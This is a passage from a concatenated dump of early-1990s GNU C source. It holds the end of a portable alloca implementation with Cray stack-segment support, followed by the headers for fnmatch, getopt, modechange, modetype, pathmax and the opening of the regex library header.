extern pointer malloc ();

/* Define STACK_DIRECTION if you know the direction of stack
   growth for your system; otherwise it will be automatically
   deduced at run-time.

   STACK_DIRECTION > 0 => grows toward higher addresses
   STACK_DIRECTION < 0 => grows toward lower addresses
   STACK_DIRECTION = 0 => direction of growth unknown  */

#ifndef STACK_DIRECTION
#define	STACK_DIRECTION	0	/* Direction unknown.  */
#endif

#if STACK_DIRECTION != 0

#define	STACK_DIR	STACK_DIRECTION	/* Known at compile-time.  */

#else /* STACK_DIRECTION == 0; need run-time code.  */

static int stack_dir;		/* 1 or -1 once known.  */
#define	STACK_DIR	stack_dir

static void
find_stack_direction ()
{
  static char *addr = NULL;	/* Address of first `dummy', once known.  */
  auto char dummy;		/* To get stack address.  */

  if (addr == NULL)
    {				/* Initial entry.  */
      addr = ADDRESS_FUNCTION (dummy);

      find_stack_direction ();	/* Recurse once.  */
    }
  else
    {
      /* Second entry.  */
      if (ADDRESS_FUNCTION (dummy) > addr)
	stack_dir = 1;		/* Stack grew upward.  */
      else
	stack_dir = -1;		/* Stack grew downward.  */
    }
}

#endif /* STACK_DIRECTION == 0 */

/* An "alloca header" is used to:
   (a) chain together all alloca'ed blocks;
   (b) keep track of stack depth.

   It is very important that sizeof(header) agree with malloc
   alignment chunk size.  The following default should work okay.  */

#ifndef	ALIGN_SIZE
#define	ALIGN_SIZE	sizeof(double)
#endif

typedef union hdr
{
  char align[ALIGN_SIZE];	/* To force sizeof(header).  */
  struct
    {
      union hdr *next;		/* For chaining headers.  */
      char *deep;		/* For stack depth measure.  */
    } h;
} header;

static header *last_alloca_header = NULL;	/* -> last alloca header.  */

/* Return a pointer to at least SIZE bytes of storage,
   which will be automatically reclaimed upon exit from
   the procedure that called alloca.  Originally, this space
   was supposed to be taken from the current stack frame of the
   caller, but that method cannot be made to work for some
   implementations of C, for example under Gould's UTX/32.  */

pointer
alloca (size)
     unsigned size;
{
  auto char probe;		/* Probes stack depth: */
  register char *depth = ADDRESS_FUNCTION (probe);

#if STACK_DIRECTION == 0
  if (STACK_DIR == 0)		/* Unknown growth direction.  */
    find_stack_direction ();
#endif

  /* Reclaim garbage, defined as all alloca'd storage that
     was allocated from deeper in the stack than currently. */

  {
    register header *hp;	/* Traverses linked list.  */

#ifdef emacs
    BLOCK_INPUT;
#endif

    for (hp = last_alloca_header; hp != NULL;)
      if ((STACK_DIR > 0 && hp->h.deep > depth)
	  || (STACK_DIR < 0 && hp->h.deep < depth))
	{
	  register header *np = hp->h.next;

	  free ((pointer) hp);	/* Collect garbage.  */

	  hp = np;		/* -> next header.  */
	}
      else
	break;			/* Rest are not deeper.  */

    last_alloca_header = hp;	/* -> last valid storage.  */

#ifdef emacs
    UNBLOCK_INPUT;
#endif
  }

  if (size == 0)
    return NULL;		/* No allocation required.  */

  /* Allocate combined header + user data storage.  */

  {
    register pointer new = malloc (sizeof (header) + size);
    /* Address of header.  */

    ((header *) new)->h.next = last_alloca_header;
    ((header *) new)->h.deep = depth;

    last_alloca_header = (header *) new;

    /* User storage begins just after header.  */

    return (pointer) ((char *) new + sizeof (header));
  }
}

#if defined (CRAY) && defined (CRAY_STACKSEG_END)

#ifdef DEBUG_I00AFUNC
#include <stdio.h>
#endif

#ifndef CRAY_STACK
#define CRAY_STACK
#ifndef CRAY2
/* Stack structures for CRAY-1, CRAY X-MP, and CRAY Y-MP */
struct stack_control_header
  {
    long shgrow:32;		/* Number of times stack has grown.  */
    long shaseg:32;		/* Size of increments to stack.  */
    long shhwm:32;		/* High water mark of stack.  */
    long shsize:32;		/* Current size of stack (all segments).  */
  };

/* The stack segment linkage control information occurs at
   the high-address end of a stack segment.  (The stack
   grows from low addresses to high addresses.)  The initial
   part of the stack segment linkage control information is
   0200 (octal) words.  This provides for register storage
   for the routine which overflows the stack.  */

struct stack_segment_linkage
  {
    long ss[0200];		/* 0200 overflow words.  */
    long sssize:32;		/* Number of words in this segment.  */
    long ssbase:32;		/* Offset to stack base.  */
    long:32;
    long sspseg:32;		/* Offset to linkage control of previous
				   segment of stack.  */
    long:32;
    long sstcpt:32;		/* Pointer to task common address block.  */
    long sscsnm;		/* Private control structure number for
				   microtasking.  */
    long ssusr1;		/* Reserved for user.  */
    long ssusr2;		/* Reserved for user.  */
    long sstpid;		/* Process ID for pid based multi-tasking.  */
    long ssgvup;		/* Pointer to multitasking thread giveup.  */
    long sscray[7];		/* Reserved for Cray Research.  */
    long ssa0;
    long ssa1;
    long ssa2;
    long ssa3;
    long ssa4;
    long ssa5;
    long ssa6;
    long ssa7;
    long sss0;
    long sss1;
    long sss2;
    long sss3;
    long sss4;
    long sss5;
    long sss6;
    long sss7;
  };

#else /* CRAY2 */
/* The following structure defines the vector of words
   returned by the STKSTAT library routine.  */
struct stk_stat
  {
    long now;			/* Current total stack size.  */
    long maxc;			/* Amount of contiguous space which would
				   be required to satisfy the maximum
				   stack demand to date.  */
    long high_water;		/* Stack high-water mark.  */
    long overflows;		/* Number of stack overflow ($STKOFEN) calls.  */
    long hits;			/* Number of internal buffer hits.  */
    long extends;		/* Number of block extensions.  */
    long stko_mallocs;		/* Block allocations by $STKOFEN.  */
    long underflows;		/* Number of stack underflow calls ($STKRETN).  */
    long stko_free;		/* Number of deallocations by $STKRETN.  */
    long stkm_free;		/* Number of deallocations by $STKMRET.  */
    long segments;		/* Current number of stack segments.  */
    long maxs;			/* Maximum number of stack segments so far.  */
    long pad_size;		/* Stack pad size.  */
    long current_address;	/* Current stack segment address.  */
    long current_size;		/* Current stack segment size.  This
				   number is actually corrupted by STKSTAT to
				   include the fifteen word trailer area.  */
    long initial_address;	/* Address of initial segment.  */
    long initial_size;		/* Size of initial segment.  */
  };

/* The following structure describes the data structure which trails
   any stack segment.  I think that the description in 'asdef' is
   out of date.  I only describe the parts that I am sure about.  */

struct stk_trailer
  {
    long this_address;		/* Address of this block.  */
    long this_size;		/* Size of this block (does not include
				   this trailer).  */
    long unknown2;
    long unknown3;
    long link;			/* Address of trailer block of previous
				   segment.  */
    long unknown5;
    long unknown6;
    long unknown7;
    long unknown8;
    long unknown9;
    long unknown10;
    long unknown11;
    long unknown12;
    long unknown13;
    long unknown14;
  };

#endif /* CRAY2 */
#endif /* not CRAY_STACK */

#ifdef CRAY2
/* Determine a "stack measure" for an arbitrary ADDRESS.
   I doubt that "lint" will like this much. */

static long
i00afunc (long *address)
{
  struct stk_stat status;
  struct stk_trailer *trailer;
  long *block, size;
  long result = 0;

  /* We want to iterate through all of the segments.  The first
     step is to get the stack status structure.  We could do this
     more quickly and more directly, perhaps, by referencing the
     $LM00 common block, but I know that this works.  */

  STKSTAT (&status);

  /* Set up the iteration.  */

  trailer = (struct stk_trailer *) (status.current_address
				    + status.current_size
				    - 15);

  /* There must be at least one stack segment.  Therefore it is
     a fatal error if "trailer" is null.  */

  if (trailer == 0)
    abort ();

  /* Discard segments that do not contain our argument address.  */

  while (trailer != 0)
    {
      block = (long *) trailer->this_address;
      size = trailer->this_size;
      if (block == 0 || size == 0)
	abort ();
      trailer = (struct stk_trailer *) trailer->link;
      if ((block <= address) && (address < (block + size)))
	break;
    }

  /* Set the result to the offset in this segment and add the sizes
     of all predecessor segments.  */

  result = address - block;

  if (trailer == 0)
    {
      return result;
    }

  do
    {
      if (trailer->this_size <= 0)
	abort ();
      result += trailer->this_size;
      trailer = (struct stk_trailer *) trailer->link;
    }
  while (trailer != 0);

  /* We are done.  Note that if you present a bogus address (one
     not in any segment), you will get a different number back, formed
     from subtracting the address of the first block.  This is probably
     not what you want.  */

  return (result);
}

#else /* not CRAY2 */
/* Stack address function for a CRAY-1, CRAY X-MP, or CRAY Y-MP.
   Determine the number of the cell within the stack,
   given the address of the cell.  The purpose of this
   routine is to linearize, in some sense, stack addresses
   for alloca.  */

static long
i00afunc (long address)
{
  long stkl = 0;

  long size, pseg, this_segment, stack;
  long result = 0;

  struct stack_segment_linkage *ssptr;

  /* Register B67 contains the address of the end of the
     current stack segment.  If you (as a subprogram) store
     your registers on the stack and find that you are past
     the contents of B67, you have overflowed the segment.

     B67 also points to the stack segment linkage control
     area, which is what we are really interested in.  */

  stkl = CRAY_STACKSEG_END ();
  ssptr = (struct stack_segment_linkage *) stkl;

  /* If one subtracts 'size' from the end of the segment,
     one has the address of the first word of the segment.

     If this is not the first segment, 'pseg' will be
     nonzero.  */

  pseg = ssptr->sspseg;
  size = ssptr->sssize;

  this_segment = stkl - size;

  /* It is possible that calling this routine itself caused
     a stack overflow.  Discard stack segments which do not
     contain the target address.  */

  while (!(this_segment <= address && address <= stkl))
    {
#ifdef DEBUG_I00AFUNC
      fprintf (stderr, "%011o %011o %011o\n", this_segment, address, stkl);
#endif
      if (pseg == 0)
	break;
      stkl = stkl - pseg;
      ssptr = (struct stack_segment_linkage *) stkl;
      size = ssptr->sssize;
      pseg = ssptr->sspseg;
      this_segment = stkl - size;
    }

  result = address - this_segment;

  /* If you subtract pseg from the current end of the stack,
     you get the address of the previous stack segment's end.
     This seems a little convoluted to me, but I'll bet you save
     a cycle somewhere.  */

  while (pseg != 0)
    {
#ifdef DEBUG_I00AFUNC
      fprintf (stderr, "%011o %011o\n", pseg, size);
#endif
      stkl = stkl - pseg;
      ssptr = (struct stack_segment_linkage *) stkl;
      size = ssptr->sssize;
      pseg = ssptr->sspseg;
      result += size;
    }
  return (result);
}

#endif /* not CRAY2 */
#endif /* CRAY */

#endif /* no alloca */
#endif /* not GCC version 2 */
/* Copyright (C) 1991, 1992, 1993 Free Software Foundation, Inc.

This library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

This library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with this library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

#ifndef	_FNMATCH_H

#define	_FNMATCH_H	1

#ifdef	__cplusplus
extern "C" {
#endif

#if defined (__cplusplus) || (defined (__STDC__) && __STDC__)
#undef	__P
#define	__P(args)	args
#else /* Not C++ or ANSI C.  */
#undef	__P
#define	__P(args)	()
/* We can get away without defining `const' here only because in this file
   it is used only inside the prototype for `fnmatch', which is elided in
   non-ANSI C where `const' is problematical.  */
#endif /* C++ or ANSI C.  */


/* We #undef these before defining them because some losing systems
   (HP-UX A.08.07 for example) define these in <unistd.h>.  */
#undef	FNM_PATHNAME
#undef	FNM_NOESCAPE
#undef	FNM_PERIOD

/* Bits set in the FLAGS argument to `fnmatch'.  */
#define	FNM_PATHNAME	(1 << 0) /* No wildcard can ever match `/'.  */
#define	FNM_NOESCAPE	(1 << 1) /* Backslashes don't quote special chars.  */
#define	FNM_PERIOD	(1 << 2) /* Leading `.' is matched only explicitly.  */

#if !defined (_POSIX_C_SOURCE) || _POSIX_C_SOURCE < 2 || defined (_GNU_SOURCE)
#define	FNM_FILE_NAME	FNM_PATHNAME /* Preferred GNU name.  */
#define	FNM_LEADING_DIR	(1 << 3) /* Ignore `/...' after a match.  */
#define	FNM_CASEFOLD	(1 << 4) /* Compare without regard to case.  */
#endif

/* Value returned by `fnmatch' if STRING does not match PATTERN.  */
#define	FNM_NOMATCH	1

/* Match STRING against the filename pattern PATTERN,
   returning zero if it matches, FNM_NOMATCH if not.  */
extern int fnmatch __P ((const char *__pattern, const char *__string,
			 int __flags));

#ifdef	__cplusplus
}
#endif

#endif /* fnmatch.h */
/* Declarations for getopt.
   Copyright (C) 1989, 90, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifndef _GETOPT_H
#define _GETOPT_H 1

#ifdef	__cplusplus
extern "C" {
#endif

/* For communication from `getopt' to the caller.
   When `getopt' finds an option that takes an argument,
   the argument value is returned here.
   Also, when `ordering' is RETURN_IN_ORDER,
   each non-option ARGV-element is returned here.  */

extern char *optarg;

/* Index in ARGV of the next element to be scanned.
   This is used for communication to and from the caller
   and for communication between successive calls to `getopt'.

   On entry to `getopt', zero means this is the first call; initialize.

   When `getopt' returns EOF, this is the index of the first of the
   non-option elements that the caller should itself scan.

   Otherwise, `optind' communicates from one call to the next
   how much of ARGV has been scanned so far.  */

extern int optind;

/* Callers store zero here to inhibit the error message `getopt' prints
   for unrecognized options.  */

extern int opterr;

/* Set to an option character which was unrecognized.  */

extern int optopt;

/* Describe the long-named options requested by the application.
   The LONG_OPTIONS argument to getopt_long or getopt_long_only is a vector
   of `struct option' terminated by an element containing a name which is
   zero.

   The field `has_arg' is:
   no_argument		(or 0) if the option does not take an argument,
   required_argument	(or 1) if the option requires an argument,
   optional_argument 	(or 2) if the option takes an optional argument.

   If the field `flag' is not NULL, it points to a variable that is set
   to the value given in the field `val' when the option is found, but
   left unchanged if the option is not found.

   To have a long-named option do something other than set an `int' to
   a compiled-in constant, such as set a value from `optarg', set the
   option's `flag' field to zero and its `val' field to a nonzero
   value (the equivalent single-letter option character, if there is
   one).  For long options that have a zero `flag' field, `getopt'
   returns the contents of the `val' field.  */

struct option
{
#if defined (__STDC__) && __STDC__
  const char *name;
#else
  char *name;
#endif
  /* has_arg can't be an enum because some compilers complain about
     type mismatches in all the code that assumes it is an int.  */
  int has_arg;
  int *flag;
  int val;
};

/* Names for the values of the `has_arg' field of `struct option'.  */

#define	no_argument		0
#define required_argument	1
#define optional_argument	2

#if defined (__STDC__) && __STDC__
#ifdef __GNU_LIBRARY__
/* Many other libraries have conflicting prototypes for getopt, with
   differences in the consts, in stdlib.h.  To avoid compilation
   errors, only prototype getopt for the GNU C library.  */
extern int getopt (int argc, char *const *argv, const char *shortopts);
#else /* not __GNU_LIBRARY__ */
extern int getopt ();
#endif /* __GNU_LIBRARY__ */
extern int getopt_long (int argc, char *const *argv, const char *shortopts,
		        const struct option *longopts, int *longind);
extern int getopt_long_only (int argc, char *const *argv,
			     const char *shortopts,
		             const struct option *longopts, int *longind);

/* Internal only.  Users should not call this directly.  */
extern int _getopt_internal (int argc, char *const *argv,
			     const char *shortopts,
		             const struct option *longopts, int *longind,
			     int long_only);
#else /* not __STDC__ */
extern int getopt ();
extern int getopt_long ();
extern int getopt_long_only ();

extern int _getopt_internal ();
#endif /* __STDC__ */

#ifdef	__cplusplus
}
#endif

#endif /* _GETOPT_H */
/* modechange.h -- definitions for file mode manipulation
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Masks for the `flags' field in a `struct mode_change'. */

/* Affect the execute bits only if at least one execute bit is set already,
   or if the file is a directory. */
#define MODE_X_IF_ANY_X 01

/* If set, copy some existing permissions for u, g, or o onto the other two.
   Which of u, g, or o is copied is determined by which bits are set in the
   `value' field. */
#define MODE_COPY_EXISTING 02

struct mode_change
{
  char op;			/* One of "=+-". */
  char flags;			/* Special operations. */
  unsigned short affected;	/* Set for u/g/o/s/s/t, if to be affected. */
  unsigned short value;		/* Bits to add/remove. */
  struct mode_change *next;	/* Link to next change in list. */
};

/* Masks for mode_compile argument. */
#define MODE_MASK_EQUALS 1
#define MODE_MASK_PLUS 2
#define MODE_MASK_MINUS 4

/* Error return values for mode_compile. */
#define MODE_INVALID (struct mode_change *) 0
#define MODE_MEMORY_EXHAUSTED (struct mode_change *) 1

#ifdef __STDC__
struct mode_change *mode_compile (char *, unsigned);
unsigned short mode_adjust (unsigned, struct mode_change *);
void mode_free (struct mode_change *);
#else
struct mode_change *mode_compile ();
unsigned short mode_adjust ();
void mode_free ();
#endif
/* modetype.h -- file type bits definitions for POSIX systems
   Requires sys/types.h sys/stat.h.
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* POSIX.1 doesn't mention the S_IFMT bits; instead, it uses S_IStype
   test macros.  To make storing file types more convenient, define
   them; the values don't need to correspond to what the kernel uses,
   because of the way we use them. */
#ifndef S_IFMT			/* Doesn't have traditional Unix macros. */
#define S_IFBLK 1
#define S_IFCHR 2
#define S_IFDIR 4
#define S_IFREG 8
#ifdef S_ISLNK
#define S_IFLNK 16
#endif
#ifdef S_ISFIFO
#define S_IFIFO 32
#endif
#ifdef S_ISSOCK
#define S_IFSOCK 64
#endif
#endif /* !S_IFMT */

#ifdef STAT_MACROS_BROKEN
#undef S_ISBLK
#undef S_ISCHR
#undef S_ISDIR
#undef S_ISREG
#undef S_ISFIFO
#undef S_ISLNK
#undef S_ISSOCK
#undef S_ISMPB
#undef S_ISMPC
#undef S_ISNWK
#endif

/* Do the reverse: define the POSIX.1 macros for traditional Unix systems
   that don't have them.  */
#if !defined(S_ISBLK) && defined(S_IFBLK)
#define	S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#endif
#if !defined(S_ISCHR) && defined(S_IFCHR)
#define	S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#endif
#if !defined(S_ISDIR) && defined(S_IFDIR)
#define	S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif
#if !defined(S_ISREG) && defined(S_IFREG)
#define	S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif
#if !defined(S_ISFIFO) && defined(S_IFIFO)
#define	S_ISFIFO(m) (((m) & S_IFMT) == S_IFIFO)
#endif
#if !defined(S_ISLNK) && defined(S_IFLNK)
#define	S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#endif
#if !defined(S_ISSOCK) && defined(S_IFSOCK)
#define	S_ISSOCK(m) (((m) & S_IFMT) == S_IFSOCK)
#endif
#if !defined(S_ISMPB) && defined(S_IFMPB) /* V7 */
#define S_ISMPB(m) (((m) & S_IFMT) == S_IFMPB)
#define S_ISMPC(m) (((m) & S_IFMT) == S_IFMPC)
#endif
#if !defined(S_ISNWK) && defined(S_IFNWK) /* HP/UX */
#define S_ISNWK(m) (((m) & S_IFMT) == S_IFNWK)
#endif
/* Define PATH_MAX somehow.  Requires sys/types.h.
   Copyright (C) 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifndef _PATHMAX_H
#define _PATHMAX_H

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

/* Non-POSIX BSD systems might have gcc's limits.h, which doesn't define
   PATH_MAX but might cause redefinition warnings when sys/param.h is
   later included (as on MORE/BSD 4.3).  */
#if defined(_POSIX_VERSION) || (defined(HAVE_LIMITS_H) && !defined(__GNUC__))
#include <limits.h>
#endif

#ifndef _POSIX_PATH_MAX
#define _POSIX_PATH_MAX 255
#endif

#if !defined(PATH_MAX) && defined(_PC_PATH_MAX)
#define PATH_MAX (pathconf ("/", _PC_PATH_MAX) < 1 ? 1024 : pathconf ("/", _PC_PATH_MAX))
#endif

/* Don't include sys/param.h if it already has been.  */
#if defined(HAVE_SYS_PARAM_H) && !defined(PATH_MAX) && !defined(MAXPATHLEN)
#include <sys/param.h>
#endif

#if !defined(PATH_MAX) && defined(MAXPATHLEN)
#define PATH_MAX MAXPATHLEN
#endif

#ifndef PATH_MAX
#define PATH_MAX _POSIX_PATH_MAX
#endif

#endif /* _PATHMAX_H */
/* Definitions for data structures and routines for the regular
   expression library, version 0.12.

   Copyright (C) 1985, 89, 90, 91, 92, 1993 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifndef __REGEXP_LIBRARY_H__
#define __REGEXP_LIBRARY_H__

/* POSIX says that <sys/types.h> must be included (by the caller) before
   <regex.h>.  */

#ifdef VMS
/* VMS doesn't have `size_t' in <sys/types.h>, even though POSIX says it
   should be there.  */
#include <stddef.h>
#endif


/* The following bits are used to determine the regexp syntax we
   recognize.  The set/not-set meanings are chosen so that Emacs syntax
   remains the value 0.  The bits are given in alphabetical order, and
   the definitions shifted by one from the previous bit; thus, when we
   add or remove a bit, only one other definition need change.  */
typedef unsigned reg_syntax_t;

/* If this bit is not set, then \ inside a bracket expression is literal.
   If set, then such a \ quotes the following character.  */
#define RE_BACKSLASH_ESCAPE_IN_LISTS (1)

/* If this bit is not set, then + and ? are operators, and \+ and \? are
     literals. 
   If set, then \+ and \? are operators and + and ? are literals.  */
#define RE_BK_PLUS_QM (RE_BACKSLASH_ESCAPE_IN_LISTS << 1)

/* If this bit is set, then character classes are supported.  They are:
     [:alpha:], [:upper:], [:lower:],  [:digit:], [:alnum:], [:xdigit:],
     [:space:], [:print:], [:punct:], [:graph:], and [:cntrl:].
   If not set, then character classes are not supported.  */
#define RE_CHAR_CLASSES (RE_BK_PLUS_QM << 1)

/* If this bit is set, then ^ and $ are always anchors (outside bracket
     expressions, of course).
   If this bit is not set, then it depends:
        ^  is an anchor if it is at the beginning of a regular
           expression or after an open-group or an alternation operator;
        $  is an anchor if it is at the end of a regular expression, or
           before a close-group or an alternation operator.  

   This bit could be (re)combined with RE_CONTEXT_INDEP_OPS, because
   POSIX draft 11.2 says that * etc. in leading positions is undefined.
   We already implemented a previous draft which made those constructs
   invalid, though, so we haven't changed the code back.  */
#define RE_CONTEXT_INDEP_ANCHORS (RE_CHAR_CLASSES << 1)

/* If this bit is set, then special characters are always special
     regardless of where they are in the pattern.
   If this bit is not set, then special characters are special only in
     some contexts; otherwise they are ordinary.  Specifically, 
     * + ? and intervals are only special when not after the beginning,
     open-group, or alternation operator.  */
#define RE_CONTEXT_INDEP_OPS (RE_CONTEXT_INDEP_ANCHORS << 1)

/* If this bit is set, then *, +, ?, and { cannot be first in an re or
     immediately after an alternation or begin-group operator.  */
#define RE_CONTEXT_INVALID_OPS (RE_CONTEXT_INDEP_OPS << 1)

/* If this bit is set, then . matches newline.
   If not set, then it doesn't.  */
#define RE_DOT_NEWLINE (RE_CONTEXT_INVALID_OPS << 1)

/* If this bit is set, then . doesn't match NUL.
   If not set, then it does.  */
#define RE_DOT_NOT_NULL (RE_DOT_NEWLINE << 1)

/* If this bit is set, nonmatching lists [^...] do not match newline.
   If not set, they do.  */
#define RE_HAT_LISTS_NOT_NEWLINE (RE_DOT_NOT_NULL << 1)

/* If this bit is set, either \{...\} or {...} defines an
     interval, depending on RE_NO_BK_BRACES. 
   If not set, \{, \}, {, and } are literals.  */
#define RE_INTERVALS (RE_HAT_LISTS_NOT_NEWLINE << 1)

/* If this bit is set, +, ? and | aren't recognized as operators.
   If not set, they are.  */
#define RE_LIMITED_OPS (RE_INTERVALS << 1)

/* If this bit is set, newline is an alternation operator.
   If not set, newline is literal.  */
#define RE_NEWLINE_ALT (RE_LIMITED_OPS << 1)

/* If this bit is set, then `{...}' defines an interval, and \{ and \}
     are literals.
  If not set, then `\{...\}' defines an interval.  */
#define RE_NO_BK_BRACES (RE_NEWLINE_ALT << 1)

/* If this bit is set, (...) defines a group, and \( and \) are literals.
   If not set, \(...\) defines a group, and ( and ) are literals.  */
#define RE_NO_BK_PARENS (RE_NO_BK_BRACES << 1)

/* If this bit is set, then \<digit> matches <digit>.
   If not set, then \<digit> is a back-reference.  */
#define RE_NO_BK_REFS (RE_NO_BK_PARENS << 1)

/* If this bit is set, then | is an alternation operator, and \| is literal. 
   If not set, then \| is an alternation operator, and | is literal.  */
#define RE_NO_BK_VBAR (RE_NO_BK_REFS << 1)

/* If this bit is set, then an ending range point collating higher
     than the starting range point, as in [z-a], is invalid.
   If not set, then when ending range point collates higher than the
     starting range point, the range is ignored.  */
#define RE_NO_EMPTY_RANGES (RE_NO_BK_VBAR << 1)

/* If this bit is set, then an unmatched ) is ordinary.
   If not set, then an unmatched ) is invalid.  */
#define RE_UNMATCHED_RIGHT_PAREN_ORD (RE_NO_EMPTY_RANGES << 1)

/* This global variable defines the particular regexp syntax to use (for
   some interfaces).  When a regexp is compiled, the syntax used is
   stored in the pattern buffer, so changing this does not affect
   already-compiled regexps.  */
extern reg_syntax_t re_syntax_options;

/* Define combinations of the above bits for the standard possibilities.
   (The [[[ comments delimit what gets put into the Texinfo file, so
   don't delete them!)  */ 
/* [[[begin syntaxes]]] */
#define RE_SYNTAX_EMACS 0

#define RE_SYNTAX_AWK							\
  (RE_BACKSLASH_ESCAPE_IN_LISTS | RE_DOT_NOT_NULL			\
   | RE_NO_BK_PARENS            | RE_NO_BK_REFS				\
   | RE_NO_BK_VBAR               | RE_NO_EMPTY_RANGES			\
   | RE_UNMATCHED_RIGHT_PAREN_ORD)

#define RE_SYNTAX_POSIX_AWK 						\
  (RE_SYNTAX_POSIX_EXTENDED | RE_BACKSLASH_ESCAPE_IN_LISTS)

#define RE_SYNTAX_GREP							\
  (RE_BK_PLUS_QM              | RE_CHAR_CLASSES				\
   | RE_HAT_LISTS_NOT_NEWLINE | RE_INTERVALS				\
   | RE_NEWLINE_ALT)

#define RE_SYNTAX_EGREP							\
  (RE_CHAR_CLASSES        | RE_CONTEXT_INDEP_ANCHORS			\
   | RE_CONTEXT_INDEP_OPS | RE_HAT_LISTS_NOT_NEWLINE			\
   | RE_NEWLINE_ALT       | RE_NO_BK_PARENS				\
   | RE_NO_BK_VBAR)

#define RE_SYNTAX_POSIX_EGREP						\
  (RE_SYNTAX_EGREP | RE_INTERVALS | RE_NO_BK_BRACES)

/* P1003.2/D11.2, section 4.20.7.1, lines 5078ff.  */
#define RE_SYNTAX_ED RE_SYNTAX_POSIX_BASIC

#define RE_SYNTAX_SED RE_SYNTAX_POSIX_BASIC

/* Syntax bits common to both basic and extended POSIX regex syntax.  */
#define _RE_SYNTAX_POSIX_COMMON						\
  (RE_CHAR_CLASSES | RE_DOT_NEWLINE      | RE_DOT_NOT_NULL		\
   | RE_INTERVALS  | RE_NO_EMPTY_RANGES)

#define RE_SYNTAX_POSIX_BASIC						\
  (_RE_SYNTAX_POSIX_COMMON | RE_BK_PLUS_QM)

/* Differs from ..._POSIX_BASIC only in that RE_BK_PLUS_QM becomes
   RE_LIMITED_OPS, i.e., \? \+ \| are not recognized.  Actually, this
   isn't minimal, since other operators, such as \`, aren't disabled.  */
#define RE_SYNTAX_POSIX_MINIMAL_BASIC					\
  (_RE_SYNTAX_POSIX_COMMON | RE_LIMITED_OPS)

#define RE_SYNTAX_POSIX_EXTENDED					\
  (_RE_SYNTAX_POSIX_COMMON | RE_CONTEXT_INDEP_ANCHORS			\
   | RE_CONTEXT_INDEP_OPS  | RE_NO_BK_BRACES				\
   | RE_NO_BK_PARENS       | RE_NO_BK_VBAR				\
   | RE_UNMATCHED_RIGHT_PAREN_ORD)

/* Differs from ..._POSIX_EXTENDED in that RE_CONTEXT_INVALID_OPS
   replaces RE_CONTEXT_INDEP_OPS and RE_NO_BK_REFS is added.  */
#define RE_SYNTAX_POSIX_MINIMAL_EXTENDED				\
  (_RE_SYNTAX_POSIX_COMMON  | RE_CONTEXT_INDEP_ANCHORS			\
   | RE_CONTEXT_INVALID_OPS | RE_NO_BK_BRACES				\
   | RE_NO_BK_PARENS        | RE_NO_BK_REFS				\
   | RE_NO_BK_VBAR	    | RE_UNMATCHED_RIGHT_PAREN_ORD)
/* [[[end syntaxes]]] */

/* Maximum number of duplicates an interval can allow.  Some systems
   (erroneously) define this in other header files, but we want our
   value, so remove any previous define.  */
#ifdef RE_DUP_MAX
#undef RE_DUP_MAX
#endif
#define RE_DUP_MAX ((1 << 15) - 1) 


/* POSIX `cflags' bits (i.e., information for `regcomp').  */

/* If this bit is set, then use extended regular expression syntax.
   If not set, then use basic regular expression syntax.  */
#define REG_EXTENDED 1

/* If this bit is set, then ignore case when matching.
   If not set, then case is significant.  */
#define REG_ICASE (REG_EXTENDED << 1)
 
/* If this bit is set, then anchors do not match at newline
     characters in the string.
   If not set, then anchors do match at newlines.  */
